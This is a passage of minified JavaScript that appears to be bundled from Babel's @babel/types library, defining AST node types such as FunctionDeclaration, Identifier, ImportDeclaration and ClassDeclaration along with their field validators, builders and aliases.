rtNodeType)("TypeParameterInstantiation"),optional:!0}},process.env.BABEL_TYPES_8_BREAKING?{}:{optional:{validate:(0,T.assertValueType)("boolean"),optional:!0},typeParameters:{validate:(0,T.assertNodeType)("TSTypeParameterInstantiation"),optional:!0}})});Z1("CatchClause",{visitor:["param","body"],fields:{param:{validate:(0,T.assertNodeType)("Identifier","ArrayPattern","ObjectPattern"),optional:!0},body:{validate:(0,T.assertNodeType)("BlockStatement")}},aliases:["Scopable","BlockParent"]});Z1("ConditionalExpression",{visitor:["test","consequent","alternate"],fields:{test:{validate:(0,T.assertNodeType)("Expression")},consequent:{validate:(0,T.assertNodeType)("Expression")},alternate:{validate:(0,T.assertNodeType)("Expression")}},aliases:["Expression","Conditional"]});Z1("ContinueStatement",{visitor:["label"],fields:{label:{validate:(0,T.assertNodeType)("Identifier"),optional:!0}},aliases:["Statement","Terminatorless","CompletionStatement"]});Z1("DebuggerStatement",{aliases:["Statement"]});Z1("DoWhileStatement",{builder:["test","body"],visitor:["body","test"],fields:{test:{validate:(0,T.assertNodeType)("Expression")},body:{validate:(0,T.assertNodeType)("Statement")}},aliases:["Statement","BlockParent","Loop","While","Scopable"]});Z1("EmptyStatement",{aliases:["Statement"]});Z1("ExpressionStatement",{visitor:["expression"],fields:{expression:{validate:(0,T.assertNodeType)("Expression")}},aliases:["Statement","ExpressionWrapper"]});Z1("File",{builder:["program","comments","tokens"],visitor:["program"],fields:{program:{validate:(0,T.assertNodeType)("Program")},comments:{validate:!process.env.BABEL_TYPES_8_BREAKING?Object.assign(()=>{},{each:{oneOfNodeTypes:["CommentBlock","CommentLine"]}}):(0,T.assertEach)((0,T.assertNodeType)("CommentBlock","CommentLine")),optional:!0},tokens:{validate:(0,T.assertEach)(Object.assign(()=>{},{type:"any"})),optional:!0}}});Z1("ForInStatement",{visitor:["left","right","body"],aliases:["Scopable","Statement","For","BlockParent","Loop","ForXStatement"],fields:{left:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,T.assertNodeType)("VariableDeclaration","LVal"):(0,T.assertNodeType)("VariableDeclaration","Identifier","MemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")},right:{validate:(0,T.assertNodeType)("Expression")},body:{validate:(0,T.assertNodeType)("Statement")}}});Z1("ForStatement",{visitor:["init","test","update","body"],aliases:["Scopable","Statement","For","BlockParent","Loop"],fields:{init:{validate:(0,T.assertNodeType)("VariableDeclaration","Expression"),optional:!0},test:{validate:(0,T.assertNodeType)("Expression"),optional:!0},update:{validate:(0,T.assertNodeType)("Expression"),optional:!0},body:{validate:(0,T.assertNodeType)("Statement")}}});var K5=()=>({params:(0,T.validateArrayOfType)("FunctionParameter"),generator:{default:!1},async:{default:!1}});V3.functionCommon=K5;var nX=()=>({returnType:{validate:(0,T.assertNodeType)("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},typeParameters:{validate:(0,T.assertNodeType)("TypeParameterDeclaration","TSTypeParameterDeclaration","Noop"),optional:!0}});V3.functionTypeAnnotationCommon=nX;var K3=()=>Object.assign({},K5(),{declare:{validate:(0,T.assertValueType)("boolean"),optional:!0},id:{validate:(0,T.assertNodeType)("Identifier"),optional:!0}});V3.functionDeclarationCommon=K3;Z1("FunctionDeclaration",{builder:["id","params","body","generator","async"],visitor:["id","typeParameters","params","predicate","returnType","body"],fields:Object.assign({},K3(),nX(),{body:{validate:(0,T.assertNodeType)("BlockStatement")},predicate:{validate:(0,T.assertNodeType)("DeclaredPredicate","InferredPredicate"),optional:!0}}),aliases:["Scopable","Function","BlockParent","FunctionParent","Statement","Pureish","Declaration"],validate:!process.env.BABEL_TYPES_8_BREAKING?void 0:function(){let X=(0,T.assertNodeType)("Identifier");return function(Q,J,Y){if(!(0,P9.default)("ExportDefaultDeclaration",Q))X(Y,"id",Y.id)}}()});Z1("FunctionExpression",{inherits:"FunctionDeclaration",aliases:["Scopable","Function","BlockParent","FunctionParent","Expression","Pureish"],fields:Object.assign({},K5(),nX(),{id:{validate:(0,T.assertNodeType)("Identifier"),optional:!0},body:{validate:(0,T.assertNodeType)("BlockStatement")},predicate:{validate:(0,T.assertNodeType)("DeclaredPredicate","InferredPredicate"),optional:!0}})});var V5=()=>({typeAnnotation:{validate:(0,T.assertNodeType)("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},optional:{validate:(0,T.assertValueType)("boolean"),optional:!0},decorators:{validate:(0,T.arrayOfType)("Decorator"),optional:!0}});V3.patternLikeCommon=V5;Z1("Identifier",{builder:["name"],visitor:["typeAnnotation","decorators"],aliases:["Expression","FunctionParameter","PatternLike","LVal","TSEntityName"],fields:Object.assign({},V5(),{name:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,T.chain)((0,T.assertValueType)("string"),Object.assign(function(X,Q,J){if(!(0,ca.default)(J,!1))throw TypeError(`"${J}" is not a valid identifier name`)},{type:"string"})):(0,T.assertValueType)("string")}}),validate:process.env.BABEL_TYPES_8_BREAKING?function(X,Q,J){let Y=/\.(\w+)$/.exec(Q.toString());if(!Y)return;let[,W]=Y,G={computed:!1};if(W==="property"){if((0,P9.default)("MemberExpression",X,G))return;if((0,P9.default)("OptionalMemberExpression",X,G))return}else if(W==="key"){if((0,P9.default)("Property",X,G))return;if((0,P9.default)("Method",X,G))return}else if(W==="exported"){if((0,P9.default)("ExportSpecifier",X))return}else if(W==="imported"){if((0,P9.default)("ImportSpecifier",X,{imported:J}))return}else if(W==="meta"){if((0,P9.default)("MetaProperty",X,{meta:J}))return}if(((0,U3.isKeyword)(J.name)||(0,U3.isReservedWord)(J.name,!1))&&J.name!=="this")throw TypeError(`"${J.name}" is not a valid identifier`)}:void 0});Z1("IfStatement",{visitor:["test","consequent","alternate"],aliases:["Statement","Conditional"],fields:{test:{validate:(0,T.assertNodeType)("Expression")},consequent:{validate:(0,T.assertNodeType)("Statement")},alternate:{optional:!0,validate:(0,T.assertNodeType)("Statement")}}});Z1("LabeledStatement",{visitor:["label","body"],aliases:["Statement"],fields:{label:{validate:(0,T.assertNodeType)("Identifier")},body:{validate:(0,T.assertNodeType)("Statement")}}});Z1("StringLiteral",{builder:["value"],fields:{value:{validate:(0,T.assertValueType)("string")}},aliases:["Expression","Pureish","Literal","Immutable"]});Z1("NumericLiteral",{builder:["value"],deprecatedAlias:"NumberLiteral",fields:{value:{validate:(0,T.chain)((0,T.assertValueType)("number"),Object.assign(function(X,Q,J){if(1/J<0||!Number.isFinite(J)){let Y=Error(`NumericLiterals must be non-negative finite numbers. You can use t.valueToNode(${J}) instead.`)}},{type:"number"}))}},aliases:["Expression","Pureish","Literal","Immutable"]});Z1("NullLiteral",{aliases:["Expression","Pureish","Literal","Immutable"]});Z1("BooleanLiteral",{builder:["value"],fields:{value:{validate:(0,T.assertValueType)("boolean")}},aliases:["Expression","Pureish","Literal","Immutable"]});Z1("RegExpLiteral",{builder:["pattern","flags"],deprecatedAlias:"RegexLiteral",aliases:["Expression","Pureish","Literal"],fields:{pattern:{validate:(0,T.assertValueType)("string")},flags:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,T.chain)((0,T.assertValueType)("string"),Object.assign(function(X,Q,J){let Y=/[^dgimsuvy]/.exec(J);if(Y)throw TypeError(`"${Y[0]}" is not a valid RegExp flag`)},{type:"string"})):(0,T.assertValueType)("string"),default:""}}});Z1("LogicalExpression",{builder:["operator","left","right"],visitor:["left","right"],aliases:["Binary","Expression"],fields:{operator:{validate:(0,T.assertOneOf)(...U5.LOGICAL_OPERATORS)},left:{validate:(0,T.assertNodeType)("Expression")},right:{validate:(0,T.assertNodeType)("Expression")}}});Z1("MemberExpression",{builder:["object","property","computed",...!process.env.BABEL_TYPES_8_BREAKING?["optional"]:[]],visitor:["object","property"],aliases:["Expression","LVal","PatternLike"],fields:Object.assign({object:{validate:(0,T.assertNodeType)("Expression","Super")},property:{validate:function(){let X=(0,T.assertNodeType)("Identifier","PrivateName"),Q=(0,T.assertNodeType)("Expression"),J=function(Y,W,G){(Y.computed?Q:X)(Y,W,G)};return J.oneOfNodeTypes=["Expression","Identifier","PrivateName"],J}()},computed:{default:!1}},!process.env.BABEL_TYPES_8_BREAKING?{optional:{validate:(0,T.assertValueType)("boolean"),optional:!0}}:{})});Z1("NewExpression",{inherits:"CallExpression"});Z1("Program",{visitor:["directives","body"],builder:["body","directives","sourceType","interpreter"],fields:{sourceType:{validate:(0,T.assertOneOf)("script","module"),default:"script"},interpreter:{validate:(0,T.assertNodeType)("InterpreterDirective"),default:null,optional:!0},directives:{validate:(0,T.arrayOfType)("Directive"),default:[]},body:(0,T.validateArrayOfType)("Statement")},aliases:["Scopable","BlockParent","Block"]});Z1("ObjectExpression",{visitor:["properties"],aliases:["Expression"],fields:{properties:(0,T.validateArrayOfType)("ObjectMethod","ObjectProperty","SpreadElement")}});Z1("ObjectMethod",{builder:["kind","key","params","body","computed","generator","async"],visitor:["decorators","key","typeParameters","params","returnType","body"],fields:Object.assign({},K5(),nX(),{kind:Object.assign({validate:(0,T.assertOneOf)("method","get","set")},!process.env.BABEL_TYPES_8_BREAKING?{default:"method"}:{}),computed:{default:!1},key:{validate:function(){let X=(0,T.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral"),Q=(0,T.assertNodeType)("Expression"),J=function(Y,W,G){(Y.computed?Q:X)(Y,W,G)};return J.oneOfNodeTypes=["Expression","Identifier","StringLiteral","NumericLiteral","BigIntLiteral"],J}()},decorators:{validate:(0,T.arrayOfType)("Decorator"),optional:!0},body:{validate:(0,T.assertNodeType)("BlockStatement")}}),aliases:["UserWhitespacable","Function","Scopable","BlockParent","FunctionParent","Method","ObjectMember"]});Z1("ObjectProperty",{builder:["key","value","computed","shorthand",...!process.env.BABEL_TYPES_8_BREAKING?["decorators"]:[]],fields:{computed:{default:!1},key:{validate:function(){let X=(0,T.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","DecimalLiteral","PrivateName"),Q=(0,T.assertNodeType)("Expression");return Object.assign(function(Y,W,G){(Y.computed?Q:X)(Y,W,G)},{oneOfNodeTypes:["Expression","Identifier","StringLiteral","NumericLiteral","BigIntLiteral","DecimalLiteral","PrivateName"]})}()},value:{validate:(0,T.assertNodeType)("Expression","PatternLike")},shorthand:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,T.chain)((0,T.assertValueType)("boolean"),Object.assign(function(X,Q,J){if(!J)return;if(X.computed)throw TypeError("Property shorthand of ObjectProperty cannot be true if computed is true");if(!(0,P9.default)("Identifier",X.key))throw TypeError("Property shorthand of ObjectProperty cannot be true if key is not an Identifier")},{type:"boolean"})):(0,T.assertValueType)("boolean"),default:!1},decorators:{validate:(0,T.arrayOfType)("Decorator"),optional:!0}},visitor:["decorators","key","value"],aliases:["UserWhitespacable","Property","ObjectMember"],validate:!process.env.BABEL_TYPES_8_BREAKING?void 0:function(){let X=(0,T.assertNodeType)("Identifier","Pattern","TSAsExpression","TSSatisfiesExpression","TSNonNullExpression","TSTypeAssertion"),Q=(0,T.assertNodeType)("Expression");return function(J,Y,W){((0,P9.default)("ObjectPattern",J)?X:Q)(W,"value",W.value)}}()});Z1("RestElement",{visitor:["argument","typeAnnotation"],builder:["argument"],aliases:["FunctionParameter","PatternLike","LVal"],deprecatedAlias:"RestProperty",fields:Object.assign({},V5(),{argument:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,T.assertNodeType)("Identifier","ArrayPattern","ObjectPattern","MemberExpression","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression","RestElement","AssignmentPattern"):(0,T.assertNodeType)("Identifier","ArrayPattern","ObjectPattern","MemberExpression","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")}}),validate:process.env.BABEL_TYPES_8_BREAKING?function(X,Q){let J=/(\w+)\[(\d+)\]/.exec(Q.toString());if(!J)throw Error("Internal Babel error: malformed key.");let[,Y,W]=J;if(X[Y].length>+W+1)throw TypeError(`RestElement must be last element of ${Y}`)}:void 0});Z1("ReturnStatement",{visitor:["argument"],aliases:["Statement","Terminatorless","CompletionStatement"],fields:{argument:{validate:(0,T.assertNodeType)("Expression"),optional:!0}}});Z1("SequenceExpression",{visitor:["expressions"],fields:{expressions:(0,T.validateArrayOfType)("Expression")},aliases:["Expression"]});Z1("ParenthesizedExpression",{visitor:["expression"],aliases:["Expression","ExpressionWrapper"],fields:{expression:{validate:(0,T.assertNodeType)("Expression")}}});Z1("SwitchCase",{visitor:["test","consequent"],fields:{test:{validate:(0,T.assertNodeType)("Expression"),optional:!0},consequent:(0,T.validateArrayOfType)("Statement")}});Z1("SwitchStatement",{visitor:["discriminant","cases"],aliases:["Statement","BlockParent","Scopable"],fields:{discriminant:{validate:(0,T.assertNodeType)("Expression")},cases:(0,T.validateArrayOfType)("SwitchCase")}});Z1("ThisExpression",{aliases:["Expression"]});Z1("ThrowStatement",{visitor:["argument"],aliases:["Statement","Terminatorless","CompletionStatement"],fields:{argument:{validate:(0,T.assertNodeType)("Expression")}}});Z1("TryStatement",{visitor:["block","handler","finalizer"],aliases:["Statement"],fields:{block:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,T.chain)((0,T.assertNodeType)("BlockStatement"),Object.assign(function(X){if(!X.handler&&!X.finalizer)throw TypeError("TryStatement expects either a handler or finalizer, or both")},{oneOfNodeTypes:["BlockStatement"]})):(0,T.assertNodeType)("BlockStatement")},handler:{optional:!0,validate:(0,T.assertNodeType)("CatchClause")},finalizer:{optional:!0,validate:(0,T.assertNodeType)("BlockStatement")}}});Z1("UnaryExpression",{builder:["operator","argument","prefix"],fields:{prefix:{default:!0},argument:{validate:(0,T.assertNodeType)("Expression")},operator:{validate:(0,T.assertOneOf)(...U5.UNARY_OPERATORS)}},visitor:["argument"],aliases:["UnaryLike","Expression"]});Z1("UpdateExpression",{builder:["operator","argument","prefix"],fields:{prefix:{default:!1},argument:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,T.assertNodeType)("Expression"):(0,T.assertNodeType)("Identifier","MemberExpression")},operator:{validate:(0,T.assertOneOf)(...U5.UPDATE_OPERATORS)}},visitor:["argument"],aliases:["Expression"]});Z1("VariableDeclaration",{builder:["kind","declarations"],visitor:["declarations"],aliases:["Statement","Declaration"],fields:{declare:{validate:(0,T.assertValueType)("boolean"),optional:!0},kind:{validate:(0,T.assertOneOf)("var","let","const","using","await using")},declarations:(0,T.validateArrayOfType)("VariableDeclarator")},validate:process.env.BABEL_TYPES_8_BREAKING?(()=>{let X=(0,T.assertNodeType)("Identifier","Placeholder"),Q=(0,T.assertNodeType)("Identifier","ArrayPattern","ObjectPattern","Placeholder"),J=(0,T.assertNodeType)("Identifier","VoidPattern","Placeholder");return function(Y,W,G){let{kind:H,declarations:$}=G,z=(0,P9.default)("ForXStatement",Y,{left:G});if(z){if($.length!==1)throw TypeError(`Exactly one VariableDeclarator is required in the VariableDeclaration of a ${Y.type}`)}for(let U of $)if(H==="const"||H==="let"||H==="var")if(!z&&!U.init)X(U,"id",U.id);else Q(U,"id",U.id);else J(U,"id",U.id)}})():void 0});Z1("VariableDeclarator",{visitor:["id","init"],fields:{id:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,T.assertNodeType)("LVal","VoidPattern"):(0,T.assertNodeType)("Identifier","ArrayPattern","ObjectPattern","VoidPattern")},definite:{optional:!0,validate:(0,T.assertValueType)("boolean")},init:{optional:!0,validate:(0,T.assertNodeType)("Expression")}}});Z1("WhileStatement",{visitor:["test","body"],aliases:["Statement","BlockParent","Loop","While","Scopable"],fields:{test:{validate:(0,T.assertNodeType)("Expression")},body:{validate:(0,T.assertNodeType)("Statement")}}});Z1("WithStatement",{visitor:["object","body"],aliases:["Statement"],fields:{object:{validate:(0,T.assertNodeType)("Expression")},body:{validate:(0,T.assertNodeType)("Statement")}}});Z1("AssignmentPattern",{visitor:["left","right","decorators"],builder:["left","right"],aliases:["FunctionParameter","Pattern","PatternLike","LVal"],fields:Object.assign({},V5(),{left:{validate:(0,T.assertNodeType)("Identifier","ObjectPattern","ArrayPattern","MemberExpression","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")},right:{validate:(0,T.assertNodeType)("Expression")},decorators:{validate:(0,T.arrayOfType)("Decorator"),optional:!0}})});Z1("ArrayPattern",{visitor:["elements","typeAnnotation"],builder:["elements"],aliases:["FunctionParameter","Pattern","PatternLike","LVal"],fields:Object.assign({},V5(),{elements:{validate:(0,T.chain)((0,T.assertValueType)("array"),(0,T.assertEach)((0,T.assertNodeOrValueType)("null","PatternLike")))}})});Z1("ArrowFunctionExpression",{builder:["params","body","async"],visitor:["typeParameters","params","predicate","returnType","body"],aliases:["Scopable","Function","BlockParent","FunctionParent","Expression","Pureish"],fields:Object.assign({},K5(),nX(),{expression:{validate:(0,T.assertValueType)("boolean")},body:{validate:(0,T.assertNodeType)("BlockStatement","Expression")},predicate:{validate:(0,T.assertNodeType)("DeclaredPredicate","InferredPredicate"),optional:!0}})});Z1("ClassBody",{visitor:["body"],fields:{body:(0,T.validateArrayOfType)("ClassMethod","ClassPrivateMethod","ClassProperty","ClassPrivateProperty","ClassAccessorProperty","TSDeclareMethod","TSIndexSignature","StaticBlock")}});Z1("ClassExpression",{builder:["id","superClass","body","decorators"],visitor:["decorators","id","typeParameters","superClass","superTypeParameters","mixins","implements","body"],aliases:["Scopable","Class","Expression"],fields:{id:{validate:(0,T.assertNodeType)("Identifier"),optional:!0},typeParameters:{validate:(0,T.assertNodeType)("TypeParameterDeclaration","TSTypeParameterDeclaration","Noop"),optional:!0},body:{validate:(0,T.assertNodeType)("ClassBody")},superClass:{optional:!0,validate:(0,T.assertNodeType)("Expression")},["superTypeParameters"]:{validate:(0,T.assertNodeType)("TypeParameterInstantiation","TSTypeParameterInstantiation"),optional:!0},implements:{validate:(0,T.arrayOfType)("TSExpressionWithTypeArguments","ClassImplements"),optional:!0},decorators:{validate:(0,T.arrayOfType)("Decorator"),optional:!0},mixins:{validate:(0,T.assertNodeType)("InterfaceExtends"),optional:!0}}});Z1("ClassDeclaration",{inherits:"ClassExpression",aliases:["Scopable","Class","Statement","Declaration"],fields:{id:{validate:(0,T.assertNodeType)("Identifier"),optional:!0},typeParameters:{validate:(0,T.assertNodeType)("TypeParameterDeclaration","TSTypeParameterDeclaration","Noop"),optional:!0},body:{validate:(0,T.assertNodeType)("ClassBody")},superClass:{optional:!0,validate:(0,T.assertNodeType)("Expression")},["superTypeParameters"]:{validate:(0,T.assertNodeType)("TypeParameterInstantiation","TSTypeParameterInstantiation"),optional:!0},implements:{validate:(0,T.arrayOfType)("TSExpressionWithTypeArguments","ClassImplements"),optional:!0},decorators:{validate:(0,T.arrayOfType)("Decorator"),optional:!0},mixins:{validate:(0,T.assertNodeType)("InterfaceExtends"),optional:!0},declare:{validate:(0,T.assertValueType)("boolean"),optional:!0},abstract:{validate:(0,T.assertValueType)("boolean"),optional:!0}},validate:!process.env.BABEL_TYPES_8_BREAKING?void 0:function(){let X=(0,T.assertNodeType)("Identifier");return function(Q,J,Y){if(!(0,P9.default)("ExportDefaultDeclaration",Q))X(Y,"id",Y.id)}}()});var X$=V3.importAttributes={attributes:{optional:!0,validate:(0,T.arrayOfType)("ImportAttribute")},assertions:{deprecated:!0,optional:!0,validate:(0,T.arrayOfType)("ImportAttribute")}};Z1("ExportAllDeclaration",{builder:["source"],visitor:["source","attributes","assertions"],aliases:["Statement","Declaration","ImportOrExportDeclaration","ExportDeclaration"],fields:Object.assign({source:{validate:(0,T.assertNodeType)("StringLiteral")},exportKind:(0,T.validateOptional)((0,T.assertOneOf)("type","value"))},X$)});Z1("ExportDefaultDeclaration",{visitor:["declaration"],aliases:["Statement","Declaration","ImportOrExportDeclaration","ExportDeclaration"],fields:{declaration:(0,T.validateType)("TSDeclareFunction","FunctionDeclaration","ClassDeclaration","Expression"),exportKind:(0,T.validateOptional)((0,T.assertOneOf)("value"))}});Z1("ExportNamedDeclaration",{builder:["declaration","specifiers","source"],visitor:["declaration","specifiers","source","attributes","assertions"],aliases:["Statement","Declaration","ImportOrExportDeclaration","ExportDeclaration"],fields:Object.assign({declaration:{optional:!0,validate:process.env.BABEL_TYPES_8_BREAKING?(0,T.chain)((0,T.assertNodeType)("Declaration"),Object.assign(function(X,Q,J){if(J&&X.specifiers.length)throw TypeError("Only declaration or specifiers is allowed on ExportNamedDeclaration");if(J&&X.source)throw TypeError("Cannot export a declaration from a source")},{oneOfNodeTypes:["Declaration"]})):(0,T.assertNodeType)("Declaration")}},X$,{specifiers:{default:[],validate:(0,T.arrayOf)(function(){let X=(0,T.assertNodeType)("ExportSpecifier","ExportDefaultSpecifier","ExportNamespaceSpecifier"),Q=(0,T.assertNodeType)("ExportSpecifier");if(!process.env.BABEL_TYPES_8_BREAKING)return X;return Object.assign(function(J,Y,W){(J.source?X:Q)(J,Y,W)},{oneOfNodeTypes:["ExportSpecifier","ExportDefaultSpecifier","ExportNamespaceSpecifier"]})}())},source:{validate:(0,T.assertNodeType)("StringLiteral"),optional:!0},exportKind:(0,T.validateOptional)((0,T.assertOneOf)("type","value"))})});Z1("ExportSpecifier",{visitor:["local","exported"],aliases:["ModuleSpecifier"],fields:{local:{validate:(0,T.assertNodeType)("Identifier")},exported:{validate:(0,T.assertNodeType)("Identifier","StringLiteral")},exportKind:{validate:(0,T.assertOneOf)("type","value"),optional:!0}}});Z1("ForOfStatement",{visitor:["left","right","body"],builder:["left","right","body","await"],aliases:["Scopable","Statement","For","BlockParent","Loop","ForXStatement"],fields:{left:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,T.assertNodeType)("VariableDeclaration","LVal");let X=(0,T.assertNodeType)("VariableDeclaration"),Q=(0,T.assertNodeType)("Identifier","MemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression");return Object.assign(function(J,Y,W){if((0,P9.default)("VariableDeclaration",W))X(J,Y,W);else Q(J,Y,W)},{oneOfNodeTypes:["VariableDeclaration","Identifier","MemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression"]})}()},right:{validate:(0,T.assertNodeType)("Expression")},body:{validate:(0,T.assertNodeType)("Statement")},await:{default:!1}}});Z1("ImportDeclaration",{builder:["specifiers","source"],visitor:["specifiers","source","attributes","assertions"],aliases:["Statement","Declaration","ImportOrExportDeclaration"],fields:Object.assign({},X$,{module:{optional:!0,validate:(0,T.assertValueType)("boolean")},phase:{default:null,validate:(0,T.assertOneOf)("source","defer")},specifiers:(0,T.validateArrayOfType)("ImportSpecifier","ImportDefaultSpecifier","ImportNamespaceSpecifier"),source:{validate:(0,T.assertNodeType)("StringLiteral")},importKind:{validate:(0,T.assertOneOf)("type","typeof","value"),optional:!0}})});Z1("ImportDefaultSpecifier",{visitor:["local"],aliases:["ModuleSpecifier"],fields:{local:{validate:(0,T.assertNodeType)("Identifier")}}});Z1("ImportNamespaceSpecifier",{visitor:["local"],aliases:["ModuleSpecifier"],fields:{local:{validate:(0,T.assertNodeType)("Identifier")}}});Z1("ImportSpecifier",{visitor:["imported","local"],builder:["local","imported"],aliases:["ModuleSpecifier"],fields:{local:{validate:(0,T.assertNodeType)("Identifier")},imported:{validate:(0,T.assertNodeType)("Identifier","StringLiteral")},importKind:{validate:(0,T.assertOneOf)("type","typeof","value"),optional:!0}}});Z1("ImportExpression",{visitor:["source","options"],aliases:["Expression"],fields:{phase:{default:null,validate:(0,T.assertOneOf)("source","defer")},source:{validate:(0,T.assertNodeType)("Expression")},options:{validate:(0,T.assertNodeType)("Expression"),optional:!0}}});Z1("MetaProperty",{visitor:["meta","property"],aliases:["Expression"],fields:{meta:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,T.chain)((0,T.assertNodeType)("Identifier"),Object.assign(function(X,Q,J){let Y;switch(J.name){case"function":Y="sent";break;case"new":Y="target";break;case"import":Y="meta";break}if(!(0,P9.default)("Identifier",X.property,{name:Y}))throw TypeError("Unrecognised MetaProperty")},{oneOfNodeTypes:["Identifier"]})):(0,T.assertNodeType)("Identifier")},property:{validate:(0,T.assertNodeType)("Identifier")}}});var UY=()=>({abstract:{validate:(0,T.assertValueType)("boolean"),optional:!0},accessibility:{validate:(0,T.assertOneOf)("public","private","protected"),optional:!0},static:{default:!1},override:{default:!1},computed:{default:!1},optional:{validate:(0,T.assertValueType)("boolean"),optional:!0},key:{validate:(0,T.chain)(function(){let X=(0,T.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral"),Q=(0,T.assertNodeType)("Expression");return function(J,Y,W){(J.computed?Q:X)(J,Y,W)}}(),(0,T.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","Expression"))}});V3.classMethodOrPropertyCommon=UY;var Q$=()=>Object.assign({},K5(),UY(),{params:(0,T.validateArrayOfType)("FunctionParameter","TSParameterProperty"),kind:{validate:(0,T.assertOneOf)("get","set","method","constructor"),default:"method"},access:{validate:(0,T.chain)((0,T.assertValueType)("string"),(0,T.assertOneOf)("public","private","protected")),optional:!0},decorators:{validate:(0,T.arrayOfType)("Decorator"),optional:!0}});V3.classMethodOrDeclareMethodCommon=Q$;Z1("ClassMethod",{aliases:["Function","Scopable","BlockParent","FunctionParent","Method"],builder:["kind","key","params","body","computed","static","generator","async"],visitor:["decorators","key","typeParameters","params","returnType","body"],fields:Object.assign({},Q$(),nX(),{body:{validate:(0,T.assertNodeType)("BlockStatement")}})});Z1("ObjectPattern",{visitor:["decorators","properties","typeAnnotation"],builder:["properties"],aliases:["FunctionParameter","Pattern","PatternLike","LVal"],fields:Object.assign({},V5(),{properties:(0,T.validateArrayOfType)("RestElement","ObjectProperty")})});Z1("SpreadElement",{visitor:["argument"],aliases:["UnaryLike"],deprecatedAlias:"SpreadProperty",fields:{argument:{validate:(0,T.assertNodeType)("Expression")}}});Z1("Super",{aliases:["Expression"]});Z1("TaggedTemplateExpression",{visitor:["tag","typeParameters","quasi"],builder:["tag","quasi"],aliases:["Expression"],fields:{tag:{validate:(0,T.assertNodeType)("Expression")},quasi:{validate:(0,T.assertNodeType)("TemplateLiteral")},["typeParameters"]:{validate:(0,T.assertNodeType)("TypeParameterInstantiation","TSTypeParameterInstantiation"),optional:!0}}});Z1("TemplateElement",{builder:["value","tail"],fields:{value:{validate:(0,T.chain)((0,T.assertShape)({raw:{validate:(0,T.assertValueType)("string")},cooked:{validate:(0,T.assertValueType)("string"),optional:!0}}),function(Q){let J=Q.value.raw,Y=!1,W=()=>{throw Error("Internal @babel/types error.")},{str:G,firstInvalidLoc:H}=(0,la.readStringContents)("template",J,0,0,0,{unterminated(){Y=!0},strictNumericEscape:W,invalidEscapeSequence:W,numericSeparatorInEscapeSequence:W,unexpectedNumericSeparator:W,invalidDigit:W,invalidCodePoint:W});if(!Y)throw Error("Invalid raw");Q.value.cooked=H?null:G})},tail:{default:!1}}});Z1("TemplateLiteral",{visitor:["quasis","expressions"],aliases:["Expression","Literal"],fields:{quasis:(0,T.validateArrayOfType)("TemplateElement"),expressions:{validate:(0,T.chain)((0,T.assertValueType)("array"),(0,T.assertEach)((0,T.assertNodeType)("Expression","TSType")),function(X,Q,J){if(X.quasis.length!==J.length+1)throw TypeError(`Number of ${X.type} quasis should be exactly one more than the number of expressions.
Expected ${J.length+1} quasis but got ${X.quasis.length}`)})}}});Z1("YieldExpression",{builder:["argument","delegate"],visitor:["argument"],aliases:["Expression","Terminatorless"],fields:{delegate:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,T.chain)((0,T.assertValueType)("boolean"),Object.assign(function(X,Q,J){if(J&&!X.argument)throw TypeError("Property delegate of YieldExpression cannot be true if there is no argument")},{type:"boolean"})):(0,T.assertValueType)("boolean"),default:!1},argument:{optional:!0,validate:(0,T.assertNodeType)("Expression")}}});Z1("AwaitExpression",{builder:["argument"],visitor:["argument"],aliases:["Expression","Terminatorless"],fields:{argument:{validate:(0,T.assertNodeType)("Expression")}}});Z1("Import",{aliases:["Expression"]});Z1("BigIntLiteral",{builder:["value"],fields:{value:{validate:(0,T.assertValueType)("string")}},aliases:["Expression","Pureish","Literal","Immutable"]});Z1("ExportNamespaceSpecifier",{visitor:["exported"],aliases:["ModuleSpecifier"],fields:{exported:{validate:(0,T.assertNodeType)("Identifier")}}});Z1("OptionalMemberExpression",{builder:["object","property","computed","optional"],visitor:["object","property"],aliases:["Expression"],fields:{object:{validate:(0,T.assertNodeType)("Expression")},property:{validate:function(){let X=(0,T.assertNodeType)("Identifier"),Q=(0,T.assertNodeType)("Expression");return Object.assign(function(Y,W,G){(Y.computed?Q:X)(Y,W,G)},{oneOfNodeTypes:["Expression","Identifier"]})}()},computed:{default:!1},optional:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,T.assertValueType)("boolean"):(0,T.chain)((0,T.assertValueType)("boolean"),(0,T.assertOptionalChainStart)())}}});Z1("OptionalCallExpression",{visitor:["callee","typeParameters","typeArguments","arguments"],builder:["callee","arguments","optional"],aliases:["Expression"],fields:Object.assign({callee:{validate:(0,T.assertNodeType)("Expression")},arguments:(0,T.validateArrayOfType)("Expression","SpreadElement","ArgumentPlaceholder"),optional:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,T.assertValueType)("boolean"):(0,T.chain)((0,T.assertValueType)("boolean"),(0,T.assertOptionalChainStart)())},typeArguments:{validate:(0,T.assertNodeType)("TypeParameterInstantiation"),optional:!0}},{typeParameters:{validate:(0,T.assertNodeType)("TSTypeParameterInstantiation"),optional:!0}})});Z1("ClassProperty",{visitor:["decorators","variance","key","typeAnnotation","value"],bui